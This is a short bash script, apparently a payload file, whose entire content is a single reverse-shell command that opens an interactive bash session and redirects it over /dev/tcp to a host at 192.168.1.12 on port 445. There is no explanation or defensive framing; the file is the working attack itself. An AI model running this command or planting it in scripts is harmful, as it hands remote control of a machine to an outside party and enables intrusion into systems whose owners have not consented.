#!/bin/bash

bash -c "bash -i >& /dev/tcp/192.168.1.12/445 0>&1"
